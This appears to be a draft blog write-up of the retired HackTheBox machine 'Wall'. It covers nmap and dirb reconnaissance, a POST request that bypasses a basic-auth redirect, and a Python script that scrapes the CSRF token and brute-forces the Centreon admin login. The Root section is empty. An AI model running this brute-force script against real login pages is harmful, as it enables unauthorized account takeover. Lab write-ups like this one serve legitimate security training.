Title:HTB: Wall
Date: xx-xx-2020 12:30
category:security
tags:security, boot2root, HTB,
meta:security, boot2root, HTB,

<img class="align-left" src="/media/2020.xx/wall_card.png" alt="Wall Card" width="262">

This box is a writeup about a retired HacktheBox machine:
[Wall](https://www.hackthebox.eu/home/machines/profile/208).
This box is rated as a medium box. It implies a lot of frustration, some

<!-- PELICAN_END_SUMMARY -->

[TOC]

# User

## Recon

Let us start as always by a `nmap` scan the ports 22 (SSH) and 80 (HTTP)
are open.

    :::text
    # Nmap 7.80 scan initiated Thu Nov 28 07:17:03 2019 as: nmap -p- -oA nmap 10.10.10.157
    Nmap scan report for 10.10.10.157
    Host is up (0.085s latency).
    Not shown: 65444 closed ports, 89 filtered ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    # Nmap done at Thu Nov 28 07:30:05 2019 -- 1 IP address (1 host up) scanned in 782.66 seconds


## Web

The home page is the default Apache page.

![Default apache page](/media/2020.xx/wall_1.png)

We run a dib against the site. Only one URL is found by the tool `/monitoring`.
```
-----------------
DIRB v2.22
By The Dark Raver
-----------------

OUTPUT_FILE: dirb
START_TIME: Thu Sep 19 11:29:07 2019
URL_BASE: http://10.10.10.157/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.157/ ----
+ http://10.10.10.157/index.html (CODE:200|SIZE:10918)
+ http://10.10.10.157/monitoring (CODE:401|SIZE:459)
+ http://10.10.10.157/server-status (CODE:403|SIZE:300)

-----------------
END_TIME: Thu Sep 19 11:41:07 2019
DOWNLOADED: 4612 - FOUND: 3
```

The page is protected with a basic auth with the message "Protected area by the
admin". We guess that the user is "admin".  We could try to bruteforce the
password but that doesn't work.

After some frustration, I sent some POST data to the page. Which result in a
redirection to `/monitoring/` (notice the final `\`) and to a new URL.

```
root@kalili:~# curl -d 'data=data' -X POST http://10.10.10.157/monitoring
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.10.157/monitoring/">here</a>.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80</address>
</body></html>
root@kalili:~# curl -d 'data=data' -X POST http://10.10.10.157/monitoring/
<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />
```

We go to the `/centreon` URL. This is another authentication form.

![Centreon authentication](/media/2020.xx/wall_2.png)

We can guess that the user is admin. We load the 50 first enrties of rockyou
(`head -n 50 rockyou.txt > rockyou_50.txt`).

*Disclaimer: Bruteforce attacks are pretty uncommon on HTB. I asked on the
Discord if this was the right track before bruteforcing as it might distrupt the
box for other users.*

When looking at the requests we can see that there is an token to protect the
application against brute force. We wrote a simple python script to make a first
request, get the token and send a authentication requests.


    :::python
    import requests
    from bs4 import BeautifulSoup

    url = "http://10.10.10.157/centreon/index.php"

    def testPassword(password):
        s = requests.Session()
        r = s.get(url)

        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.find_all('input')[3].get('value')

        r = s.post(url, data = {'useralias':'admin', 'password': password, 'submitLogin':'Connect', 'centreon_token':token})
        if ('Your credentials are incorrect.' not in r.text):
            print(password)

    file = open("rockyou_50.txt")
    for password in file:
        testPassword(password.strip())

We launch the sciript and get the password: `password1`.

```
python3 bruteforce.py
password1

```

We can login in the centron interface.

![Centreon interface](/media/2020.xx/wall_3.png)

# Root

# Wrapping up
